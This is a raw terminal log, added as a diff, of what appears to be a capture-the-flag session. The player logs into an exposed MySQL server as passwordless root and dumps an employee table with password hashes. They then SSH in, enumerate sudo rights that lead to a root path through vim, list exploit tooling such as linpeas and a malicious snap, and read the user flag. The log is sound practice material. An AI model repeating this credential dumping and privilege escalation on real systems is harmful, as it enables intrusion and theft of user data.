@@ -1,0 +1,137 @@
+──(kali㉿kali)-[~/CTF/CICRA/scriptkiddie]
+└─$ mysql -h 64.225.42.219 -u root --skip-ssl
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 526
+Server version: 8.0.44-0ubuntu0.24.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Support MariaDB developers by giving a star at https://github.com/MariaDB/server
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| TechInnovate_Corp  |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.234 sec)
+
+MySQL [(none)]> use TechInnovate_Corp
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [TechInnovate_Corp]> SELECT * FROM employees
+    -> ;
++----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+
+| id | employee_id | username   | display_name    | email                       | password_hash                                                    | department  | job_title            | manager_id | is_active | failed_login_attempts | last_login | password_changed_date | created_date        |
++----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+
+|  1 | EMP1001     | jwilson    | James Wilson    | jwilson@techinnovate.com    |                                                                  | IT          | System Administrator |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
+|  2 | EMP1002     | schen      | Sarah Chen      | schen@techinnovate.com      | $2b$12$LQv3c1yqB.WTQOBd0UwqO.O6oW7jbx1jCJ.9tRk6M2p8uZc6JY8ZO     | Finance     | Financial Analyst    |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
+|  3 | EMP1003     | mrodriguez | Maria Rodriguez | mrodriguez@techinnovate.com | $2b$12$N7yA8tBv.CW3eR9wX2z5Qe.rP8sJ3bV2kL.Ma9rK5pYfG4tN1qZsx     | HR          | HR Manager           |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
+|  4 | EMP1004     | tjohnson   | Thomas Johnson  | tjohnson@techinnovate.com   | $2b$12$P9zB0uCx.DX4eS0wY3a6Re.sQ9tK4cW3lN.Oa0sL7qZgH5uM2rVwz     | Development | Senior Developer     |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
+|  6 | EMP1006     | dthompson  | David Thompson  | dthompson@techinnovate.com  | e3927cf17b05649d1f7ccaa14a5d0f03857a12dd111e7700ffbdf3de03295c2e | Operations  | Operations Manager   |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
+|  7 | EMP1007     | lpark      | Lisa Park       | lpark@techinnovate.com      | f01e0d7992a3b7748538d02291b0beae                                 | IT          | Security Analyst     |       NULL |         1 |                     0 | NULL       | 2025-11-22 11:15:22   | 2025-11-22 11:15:22 |
++----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+
+6 rows in set (0.246 sec)
+
+MySQL [TechInnovate_Corp]> SELECT * FROM employees;
++----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+                                         
+| id | employee_id | username   | display_name    | email                       | password_hash                                                    | department  | job_title            | manager_id | is_active | failed_login_attempts | last_login | password_changed_date | created_date        |                                         
++----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+                                         
+|  1 | EMP1001     | jwilson    | James Wilson    | jwilson@techinnovate.com    |                                                                  | IT          | System Administrator |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |                                         
+|  2 | EMP1002     | schen      | Sarah Chen      | schen@techinnovate.com      | $2b$12$LQv3c1yqB.WTQOBd0UwqO.O6oW7jbx1jCJ.9tRk6M2p8uZc6JY8ZO     | Finance     | Financial Analyst    |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |                                         
+|  3 | EMP1003     | mrodriguez | Maria Rodriguez | mrodriguez@techinnovate.com | $2b$12$N7yA8tBv.CW3eR9wX2z5Qe.rP8sJ3bV2kL.Ma9rK5pYfG4tN1qZsx     | HR          | HR Manager           |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |                                         
+|  4 | EMP1004     | tjohnson   | Thomas Johnson  | tjohnson@techinnovate.com   | $2b$12$P9zB0uCx.DX4eS0wY3a6Re.sQ9tK4cW3lN.Oa0sL7qZgH5uM2rVwz     | Development | Senior Developer     |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |                                         
+|  6 | EMP1006     | dthompson  | David Thompson  | dthompson@techinnovate.com  | e3927cf17b05649d1f7ccaa14a5d0f03857a12dd111e7700ffbdf3de03295c2e | Operations  | Operations Manager   |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
+|  7 | EMP1007     | lpark      | Lisa Park       | lpark@techinnovate.com      | f01e0d7992a3b7748538d02291b0beae                                 | IT          | Security Analyst     |       NULL |         1 |                     0 | NULL       | 2025-11-22 11:15:22   | 2025-11-22 11:15:22 |
++----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+
+6 rows in set (0.242 sec)
+
+MySQL [TechInnovate_Corp]> exit
+Bye
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/CTF/CICRA/scriptkiddie]
+└─$ ssh lpark@64.225.42.219                  
+lpark@64.225.42.219's password: 
+Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-71-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Nov 22 11:54:28 UTC 2025
+
+  System load:  0.37              Processes:             270
+  Usage of /:   7.0% of 47.39GB   Users logged in:       2
+  Memory usage: 67%               IPv4 address for eth0: 64.225.42.219
+  Swap usage:   0%                IPv4 address for eth0: 10.46.0.6
+
+Expanded Security Maintenance for Applications is not enabled.
+
+45 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+*** System restart required ***
+Last login: Sat Nov 22 11:54:29 2025 from 203.189.186.106
+lpark@cicractf2:~$ sudo -l
+Matching Defaults entries for lpark on cicractf2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User lpark may run the following commands on cicractf2:
+    (alice) NOPASSWD: ALL
+    (alice) NOPASSWD
+lpark@cicractf2:~$ sudo -u alice sudo -l
+Matching Defaults entries for alice on cicractf2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User alice may run the following commands on cicractf2:
+    (root) NOPASSWD: /usr/bin/vim, /usr/bin/vi
+lpark@cicractf2:~$ ls -;a
+ls: cannot access '-': No such file or directory
+a: command not found
+lpark@cicractf2:~$ ls -la
+total 159276
+drwxr-x--- 10 lpark lpark      4096 Nov 22 11:55 .
+drwxr-xr-x  4 root  root       4096 Nov 22 07:06 ..
+-rw-------  1 lpark lpark        55 Nov 22 11:38 .Xauthority
+-rw-------  1 lpark lpark      4856 Nov 22 11:54 .bash_history
+-rw-r--r--  1 lpark lpark       220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 lpark lpark      3771 Mar 31  2024 .bashrc
+drwx------  2 lpark lpark      4096 Nov 22 04:06 .cache
+-rw-r--r--  1 lpark lpark         0 Nov 22 01:08 .cloud-locale-test.skip
+drwxrwxr-x  2 lpark lpark      4096 Nov 22 10:15 .conda
+drwx------  5 lpark lpark      4096 Nov 22 11:48 .gnupg
+-rw-------  1 lpark lpark        20 Nov 22 11:36 .lesshst
+drwxrwxr-x  3 lpark lpark      4096 Nov 22 09:58 .local
+-rw-------  1 lpark lpark       114 Nov 22 09:48 .mysql_history
+-rw-r--r--  1 lpark lpark       807 Mar 31  2024 .profile
+-rw-------  1 lpark lpark        19 Nov 22 10:15 .python_history
+drwx------  2 lpark lpark      4096 Nov 22 11:42 .ssh
+-rw-------  1 root  lpark       556 Nov 22 11:48 .viminfo
+-rw-rw-r--  1 lpark lpark       258 Nov 22 11:36 .wget-hsts
+-rwxrwxr-x  1 lpark lpark     10559 Nov 22 10:23 46361
+-rw-rw-r--  1 lpark lpark 157891003 Nov 11 19:01 Miniconda3-latest-Linux-x86_64.sh
+-rw-r--r--  1 lpark lpark      4096 Nov 22 11:53 evil-pwn_0.1_all.snap
+-rwxrwxr-x  1 lpark lpark    971926 Nov 15 15:04 linpeas.sh
+drwxrwxr-x  3 lpark lpark      4096 Nov 22 11:51 malicious-snap
+drwx------  3 lpark lpark      4096 Nov 22 11:40 snap
+drwxrwxr-x  3 lpark lpark      4096 Nov 22 11:55 snap-exploit
+-rwxr-xr-x  1 lpark lpark   4126400 Nov 22 11:46 vim
+lpark@cicractf2:~$ ls /home/
+alice  lpark
+lpark@cicractf2:~$ cd ../alice/
+lpark@cicractf2:/home/alice$ ls
+user.txt
+lpark@cicractf2:/home/alice$ cat user.txt 
+HashX{903f7343de2838cc95ee4f994bf613ae}
+lpark@cicractf2:/home/alice$
